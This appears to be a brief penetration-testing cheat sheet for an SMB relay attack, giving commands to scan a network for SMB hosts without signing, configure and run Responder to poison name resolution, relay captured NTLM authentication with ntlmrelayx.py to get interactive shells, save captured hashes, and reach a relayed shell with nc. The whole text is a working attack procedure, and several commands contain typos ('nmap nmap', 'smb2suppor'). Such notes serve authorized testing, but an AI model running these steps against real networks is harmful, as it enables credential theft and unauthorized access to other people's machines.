# SMB Relay

Step 1 Check if SMB Relay is Possible
nmap nmap –script=smb2-security-mode.nse -p445 <IP Address>
nmap –script=smb2-security-mode.nse -p445 10.0.0.0/8

Step 2 Save targets to file
nano targets.txt
Paste IP addresses to the file
Save File
<img width="940" height="506" alt="image" src="https://github.com/user-attachments/assets/7b0f4364-ae4b-41cb-8737-00e78b5cedbd" />

Step 3 
sudo mousepad /etc/responder/Responder.conf

Under Servers to start
turn off SMB
turn off HTTP
<img width="940" height="367" alt="image" src="https://github.com/user-attachments/assets/29972107-174e-46cd-b1c2-941d1976344b" />

Step 4 Run Responder
sudo responder -I wlan0 -dwP

Step 5 Run ntlmrelayx.py
sudo ntlmrelayx.py -tf targets.txt -smb2support
sudo ntlmrelayx.py -tf targets.txt -smb2suppor -i (will give an interactive shell)

Step 6 Save the hashes
nano hashes.txt
Paste hashes and save

Step 7 Interactive
when a shell is corrected you can access it by going to 
nc 127.0.0.1 1100
